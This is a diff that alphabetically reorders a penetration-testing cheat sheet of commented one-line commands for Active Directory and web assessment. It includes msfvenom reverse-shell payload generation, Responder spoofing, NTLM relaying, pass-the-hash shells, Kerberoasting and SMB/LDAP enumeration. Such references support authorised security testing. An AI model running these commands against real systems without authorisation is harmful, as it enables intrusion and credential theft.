@@ -1,50 +1,20 @@
-# msfvenom generate meterpreter with file format exe for windows
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe
+# aquatone screenshot all urls in a given file and generate a nice html overview
+cat <urls-in-file> | aquatone -out <out-folder>
 
-# msfvenom generate java tcp reverse shell with file format war for tomcat deployment
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war
-
-# msfvenom list available payloads
-msfvenom -l payloads
-
-# wfuzz fuzz a get parameter with; -f out file; --hw hide response with word count; --hh hide response with character count; --hc <code> hide responsecode <code>
-wfuzz --hw <word-count> -f <out-file> -w <wordlist> 'https://target.url?param1=FUZZ&param2=42'
-
-# dirsearch with standard wordlist; -b scan domain not ip; -F follow redirects; -r recourse; -R <l> search recourseive with level <l>
-dirsearch -u '<target-url>' -b -F -r -R <l> --csv-report <out-file>.csv
-
-# dirsearch with input list and 4 thrads
-dirsearch -L <in-list> -t 4
-
-# nikto with conssole output an html outfile; -Tuning 1234bde Test for 1: Interesting File / Seen in logs 2: Misconfiguration / Default File 3: Information Disclosure 4: Injection (XSS/Script/HTML)  b: Software Identification
-nikto -Display 1234EP -Tuning 1234bde -o <file-name>.html -Format htm -host '<target-url>'
+# bloodhound-python BloodHound ingestor
+bloodhound-python -u '<username>' -p 'password' -dc <dc-hostname> -d <fqdn> -c ALL [--hashes 'LM:NLTM'] [-ns <name-server-ip-to-use>]
 
 # cewl generate a password list from a website; -w out file, -d search-dapth 2, -m minimum length 5
 cewl -w <file-name>.txt --with-numbers -d 2 -m 7 <target-url>
 
-# aquatone screenshot all urls in a given file and generate a nice html overview
-cat <urls-in-file> | aquatone -out <out-folder>
+# dirsearch with input list and 4 thrads
+dirsearch -L <in-list> -t 4
 
-# Responder.py analyze mode; Listen for packeges and list them on screen
-Responder.py -I <interface> -A
+# dirsearch with standard wordlist; -b scan domain not ip; -F follow redirects; -r recourse; -R <l> search recourseive with level <l>
+dirsearch -u '<target-url>' -b -F -r -R <l> --csv-report <out-file>.csv
 
-# Responder.py start spoofing attack
-Responder.py -I <interface>
-
-# ntlmrealyx LDAP/SMB... relaying attack; -tf Tagget file; with -t ldap://<ip>, ldaps://<ip>, smb://<ip> single target
-ntlmrelayx.py -tf <dc-ip.list>
-
-# gobuster fuzz for direcotries with wordlist; -o out file, -r follow redirects, -k ignore ssl certificate errors, -w wordlist, -x file extensions to append
-gobuster dir -u '<target-url>' -o <out-file> -r -k -w <path-to-wordlist> [-x php,aspx,html,txt]
-
-# wpscan do a wordpress scan for; vp Vulnerable plugins, cb Config backups, dbe Db exports, u Users, m Media and write the result to <out-file>
-wpscan --url <target-url> -e vp,cb,dbe,u,m -o <out-file>
-
-# wpscan update the plugin db
-wpscan --update
-
-# hashcat generate a password list with a given start list and a given rule
-hashcat --force --stdout -r <path-to-rule> <in-list>
+# evil-winrm interactive shell with username and password
+evil-winrm -i <target-ip> -u <username> -p <password>
 
 # GetADUsers.py enumerate AD users with and password
 GetADUsers.py -all '<fqdn>/[<username>:<password>]' -dc-ip <dc-ip-address>
@@ -52,32 +22,20 @@ GetADUsers.py -all '<fqdn>/[<username>:<password>]' -dc-ip <dc-ip-address>
 # GetADUsers.py enumerate AD users with hash
 GetADUsers.py -all '<fqdn>/<username>' -dc-ip <dc-ip-address> -hashes '<LMHASH>:<NTHASH>'
 
-# smbmap list unauthenticated SMB shares with permissions
-smbmap -H <target-ip-or-domain>
-
-# smbmap list authenticated all accesible files
-smbmap -H <target-ip-or-domain> -u <username> -p <password-or-hash> -d <fqdn> -R <share>
-
-# smbmap download file
-smbmap -H <target-ip-or-domain> [-u <username> -p <password-or-hash> -d <fqdn>] --download '.\Path\To\File'
-
-# ldapdomaindump dump the domain ldap info human readable as html and json
-ldapdomaindump -u '<fqdn>\<username>' -p '<password-or-LM:NTLM-hash>' -o <outfolder> <dc-ip>
-
-# bloodhound-python BloodHound ingestor
-bloodhound-python -u '<username>' -p 'password' -dc <dc-hostname> -d <fqdn> -c ALL [--hashes 'LM:NLTM'] [-ns <name-server-ip-to-use>]
-
-# psexec interactive shell as Administrator with username and password or with hashes
-psexec.py '<fqdn>/<username>[:<password>]@<target-ip-or-host>' [-hashes LMHASH:NTHASH] [-dc-ip <dc-ip>]
+# GetNPUsers.py get all users and hashes in AD that have NO preauthentication enabled
+GetNPUsers.py '<fqdn>/[<username>]'  -dc-ip <dc-ip> [-request -outputfile <out-file>]
 
 # GetUserSPNs.py get user accounts with more than one service principal name (= kerberoastable) and request a TGS for them
 GetUserSPNs.py '<fqdn>/<user>:<password>' -dc-ip <dc-ip> [-request -outputfile <out-file>]
 
-# GetNPUsers.py get all users and hashes in AD that have NO preauthentication enabled
-GetNPUsers.py '<fqdn>/[<username>]'  -dc-ip <dc-ip> [-request -outputfile <out-file>]
+# gobuster fuzz for direcotries with wordlist; -o out file, -r follow redirects, -k ignore ssl certificate errors, -w wordlist, -x file extensions to append
+gobuster dir -u '<target-url>' -o <out-file> -r -k -w <path-to-wordlist> [-x php,aspx,html,txt]
 
-# evil-winrm interactive shell with username and password
-evil-winrm -i <target-ip> -u <username> -p <password>
+# hashcat generate a password list with a given start list and a given rule
+hashcat --force --stdout -r <path-to-rule> <in-list>
+
+# ldapdomaindump dump the domain ldap info human readable as html and json
+ldapdomaindump -u '<fqdn>\<username>' -p '<password-or-LM:NTLM-hash>' -o <outfolder> <dc-ip>
 
 # ldapsearch dump raw AD information from DC anonymously
 ldapsearch -x -H ldap://<dc-ip> -b '' -s base '(objectclass=*)'
@@ -85,11 +43,53 @@ ldapsearch -x -H ldap://<dc-ip> -b '' -s base '(objectclass=*)'
 # ldapsearch raw raw AD users from DC anonymously
 ldapsearch -x -H ldap://<dc-ip> -b 'DC=<domain>,DC=<domain-suffix>' '(objectClass=person)'
 
+# msfvenom generate java tcp reverse shell with file format war for tomcat deployment
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=<port> -f war
+
+# msfvenom generate meterpreter with file format exe for windows
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe
+
+# msfvenom list available payloads
+msfvenom -l payloads
+
+# nikto with conssole output an html outfile; -Tuning 1234bde Test for 1: Interesting File / Seen in logs 2: Misconfiguration / Default File 3: Information Disclosure 4: Injection (XSS/Script/HTML)  b: Software Identification
+nikto -Display 1234EP -Tuning 1234bde -o <file-name>.html -Format htm -host '<target-url>'
+
+# ntlmrealyx LDAP/SMB... relaying attack; -tf Tagget file; with -t ldap://<ip>, ldaps://<ip>, smb://<ip> single target
+ntlmrelayx.py -tf <dc-ip.list>
+
+# psexec interactive shell as Administrator with username and password or with hashes
+psexec.py '<fqdn>/<username>[:<password>]@<target-ip-or-host>' [-hashes LMHASH:NTHASH] [-dc-ip <dc-ip>]
+
+# Responder.py analyze mode; Listen for packeges and list them on screen
+Responder.py -I <interface> -A
+
+# Responder.py start spoofing attack
+Responder.py -I <interface>
+
 # rpcclient interactive session; -U <user>; -N anonymous login
 rpcclient [-U <user>| -N] <target-ip-or-domain>
+
+# smbclient interactive smb connection; -W domain; -U user name
+smbclient \\\\<ip-or-hostname>\\<share-name> [-W <domain-name> -U <user>]
 
 # smbclient list shares; -L list shares; -N anonymous auth; -U user;
 smbclient -L <ip-or-hostname> [-N | -U <user>]
 
-# smbclient interactive smb connection; -W domain; -U user name
-smbclient \\\\<ip-or-hostname>\\<share-name> [-W <domain-name> -U <user>]
+# smbmap download file
+smbmap -H <target-ip-or-domain> [-u <username> -p <password-or-hash> -d <fqdn>] --download '.\Path\To\File'
+
+# smbmap list authenticated all accesible files
+smbmap -H <target-ip-or-domain> -u <username> -p <password-or-hash> -d <fqdn> -R <share>
+
+# smbmap list unauthenticated SMB shares with permissions
+smbmap -H <target-ip-or-domain>
+
+# wfuzz fuzz a get parameter with; -f out file; --hw hide response with word count; --hh hide response with character count; --hc <code> hide responsecode <code>
+wfuzz --hw <word-count> -f <out-file> -w <wordlist> 'https://target.url?param1=FUZZ&param2=42'
+
+# wpscan do a wordpress scan for; vp Vulnerable plugins, cb Config backups, dbe Db exports, u Users, m Media and write the result to <out-file>
+wpscan --url <target-url> -e vp,cb,dbe,u,m -o <out-file>
+
+# wpscan update the plugin db
+wpscan --update
